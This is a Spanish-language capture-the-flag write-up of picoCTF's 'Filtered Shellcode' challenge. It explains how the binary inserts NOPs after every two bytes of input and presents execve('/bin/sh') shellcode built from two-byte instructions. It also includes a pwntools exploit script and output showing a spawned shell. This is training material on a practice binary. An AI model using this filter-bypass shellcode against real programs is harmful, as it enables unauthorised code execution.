---
description: Filtered Shellcode
---

# Filtered-Shellcode

En el ejercicio nos dan un binario. Al ejecutarlo podemos ver lo siguiente:

```c
./fun                                                                                                                                          3.13.7  01:01 
Give me code to run:
hola
[1]    95803 segmentation fault (core dumped)  ./fun
```

Vale, fácil de entender, parece que nos deja ejecutar el shellcode que le mandemos. Si no hubiera ningún tipo de limitación o regla por el medio, simplemente con un shellcode como el siguiente podríamos conseguir una shell:

```asm
xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
xor edx,edx
mov al,0x0b
int 0x80
```

Si analizamos un poco el código en Ghidra podemos ver dos cosas:

```c
  for (; (input_char != '\n' && (contador < 1000)); contador = contador + 1) {
    array_input[contador] = input_char;
    input = fgetc(_stdin);
    input_char = (char)input;
  }
```

Primero, tenemos un límite de 1000 bytes/chars para nuestro shellcode, con lo cual este no es el problema.

```c
    for (local_10 = 0; local_10 < doble_contador; local_10 = local_10 + 1) {
      if ((int)local_10 % 4 < 2) {
        auStack_2c[local_10 + iVar1] = *(undefined *)(array_input + local_14);
        local_14 = local_14 + 1;
      }
      else {
        auStack_2c[local_10 + iVar1] = 0x90;
      }
    }
```

Este `for` está haciendo que, por cada 4 bytes (2 bytes y 2 bytes) de nuestro shellcode personalizado, el programa meta 2 NOPs. Esto quiere decir que si nuestras instrucciones ocupan más de 2 bytes por línea, se van a cortar y nuestro shellcode no va a funcionar:

```c
// Representación gráfica
[2 bytes] [2 bytes] [NOP] [NOP] [2 bytes] [2 bytes] [NOP] [NOP] . . .
```

Si tomamos como referencia el shellcode simple de antes y miramos cuántos bytes ocupa cada instrucción, podemos ver lo siguiente:

```c
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f "//sh"
   8:   68 2f 62 69 6e          push   0x6e69622f "/bin"
   d:   89 e3                   mov    ebx, esp
   f:   31 c9                   xor    ecx, ecx
  11:   31 d2                   xor    edx, edx
  13:   b0 0b                   mov    al, 0xb
  15:   cd 80                   int    0x80
```

Todas nuestras instrucciones tienen como máximo 2 bytes, excepto las dos que hacen push de `/bin/sh` al stack. ¿Cómo podemos entonces pushearlo con esta limitación? Podemos subir la cadena byte a byte usando `rdi` como puntero:

```asm
        mov edi,esp            # edi apunta al inicio del buffer
        
        mov al,0x2f            # '/' -> cargar en al
        add [edi],al           # escribir '/' en [edi]
        inc edi                # pasar al siguiente byte
        nop                    # alineamiento
```

Si hacemos esto para cada caracter, los NOPs no nos van a fastidiar. Sabiendo esto, podemos montar el exploit:

```python
#!/usr/bin/env python3
from pwn import *
import sys

exe = ELF("./fun_patched")
context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("mercury.picoctf.net", 37853)

def main():
    io = conn()
    shellcode = asm(
        """
        xor eax,eax            # poner eax a 0
        push eax               # terminador NULL
        push eax               # reservar 4 bytes (padding)
        mov edi,esp            # edi apunta al inicio del buffer
        mov al,0x2f            # '/' -> cargar en al
        add [edi],al           # escribir '/' en [edi]
        inc edi                # pasar al siguiente byte
        nop                    # alineamiento
        mov al,0x62
        add [edi],al
        inc edi
        nop
        mov al,0x69
        add [edi],al
        inc edi
        nop
        mov al,0x6e
        add [edi],al
        inc edi
        nop
        mov al,0x2f
        add [edi],al
        inc edi
        nop
        mov al,0x73
        add [edi],al
        inc edi
        nop
        mov al,0x68
        add [edi],al
        inc edi
        nop
        mov ebx,esp            # ebx apunta a la cadena "/bin/sh"
        xor ecx,ecx            # argv = NULL
        xor edx,edx            # envp = NULL
        xor eax,eax            # poner eax a 0
        mov al,0x0b            # syscall 11 = execve
        int 0x80               # invocar syscall
        """
    )
    
    print("Shellcode (hex):", shellcode.hex())
    print("Longitud total:", len(shellcode), "bytes\n")
    print("Desensamblado:")
    for ins in disasm(shellcode).splitlines():
        print(ins)
    
    io.recvline(b'Give me code to run:')
    io.sendline(shellcode)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

Lo probamos:

```c
python solve.py DEBUG LOCAL                                                                                                                    3.13.7  01:45 
[*] '/home/ub1cu0/Desktop/PWN/picoCTF/filtered_shellcode/fun_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Desktop/PWN/picoCTF/filtered_shellcode/fun_patched': pid 98732
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3.13/site-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
            xor eax,eax # poner eax a 0
            push eax # terminador NULL
            push eax # reservar 4 bytes (padding)
            mov edi,esp # edi apunta al inicio del buffer
            mov al,0x2f # '/' -> cargar en al
            add [edi],al # escribir '/' en [edi]
            inc edi # pasar al siguiente byte
            nop # alineamiento
            mov al,0x62
            add [edi],al
            inc edi
            nop
            mov al,0x69
            add [edi],al
            inc edi
            nop
            mov al,0x6e
            add [edi],al
            inc edi
            nop
            mov al,0x2f
            add [edi],al
            inc edi
            nop
            mov al,0x73
            add [edi],al
            inc edi
            nop
            mov al,0x68
            add [edi],al
            inc edi
            nop
            mov ebx,esp # ebx apunta a la cadena "/bin/sh"
            xor ecx,ecx # argv = NULL
            xor edx,edx # envp = NULL
            xor eax,eax # poner eax a 0
            mov al,0x0b # syscall 11 = execve
            int 0x80 # invocar syscall
[DEBUG] /usr/bin/as -32 -o /tmp/pwn-asm-73wzrdf6/step2 /tmp/pwn-asm-73wzrdf6/step1
[DEBUG] /usr/bin/objcopy -j .shellcode -Obinary /tmp/pwn-asm-73wzrdf6/step3 /tmp/pwn-asm-73wzrdf6/step4
Shellcode (hex): 31c0505089e7b02f00074790b06200074790b06900074790b06e00074790b02f00074790b07300074790b0680007479089e331c931d231c0b00bcd80
Longitud total: 60 bytes
Desensamblado:
[DEBUG] /usr/bin/objcopy -I binary -O elf32-i386 -B i386 --set-section-flags .data=code --rename-section .data=.text -w -N * /tmp/pwn-disasm-9h_65lbl/step1 /tmp/pwn-disasm-9h_65lbl/step2
[DEBUG] /usr/bin/objdump -Mintel -w -d --adjust-vma 0 -b elf32-i386 /tmp/pwn-disasm-9h_65lbl/step2
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   50                      push   eax
   4:   89 e7                   mov    edi, esp
   6:   b0 2f                   mov    al, 0x2f
   8:   00 07                   add    BYTE PTR [edi], al
   a:   47                      inc    edi
   b:   90                      nop
   c:   b0 62                   mov    al, 0x62
   e:   00 07                   add    BYTE PTR [edi], al
  10:   47                      inc    edi
  11:   90                      nop
  12:   b0 69                   mov    al, 0x69
  14:   00 07                   add    BYTE PTR [edi], al
  16:   47                      inc    edi
  17:   90                      nop
  18:   b0 6e                   mov    al, 0x6e
  1a:   00 07                   add    BYTE PTR [edi], al
  1c:   47                      inc    edi
  1d:   90                      nop
  1e:   b0 2f                   mov    al, 0x2f
  20:   00 07                   add    BYTE PTR [edi], al
  22:   47                      inc    edi
  23:   90                      nop
  24:   b0 73                   mov    al, 0x73
  26:   00 07                   add    BYTE PTR [edi], al
  28:   47                      inc    edi
  29:   90                      nop
  2a:   b0 68                   mov    al, 0x68
  2c:   00 07                   add    BYTE PTR [edi], al
  2e:   47                      inc    edi
  2f:   90                      nop
  30:   89 e3                   mov    ebx, esp
  32:   31 c9                   xor    ecx, ecx
  34:   31 d2                   xor    edx, edx
  36:   31 c0                   xor    eax, eax
  38:   b0 0b                   mov    al, 0xb
  3a:   cd 80                   int    0x80
[DEBUG] Received 0x15 bytes:
    b'Give me code to run:\n'
[DEBUG] Sent 0x3d bytes:
    00000000  31 c0 50 50  89 e7 b0 2f  00 07 47 90  b0 62 00 07  │1·PP│···/│··G·│·b··│
    00000010  47 90 b0 69  00 07 47 90  b0 6e 00 07  47 90 b0 2f  │G··i│··G·│·n··│G··/│
    00000020  00 07 47 90  b0 73 00 07  47 90 b0 68  00 07 47 90  │··G·│·s··│G··h│··G·│
    00000030  89 e3 31 c9  31 d2 31 c0  b0 0b cd 80  0a           │··1·│1·1·│····│·│
    0000003d
[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x7 bytes:
    b'ub1cu0\n'
ub1cu0
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1b bytes:
    b'fun  fun_patched  solve.py\n'
fun  fun_patched  solve.py
```

Funciona! Gracias por leer.
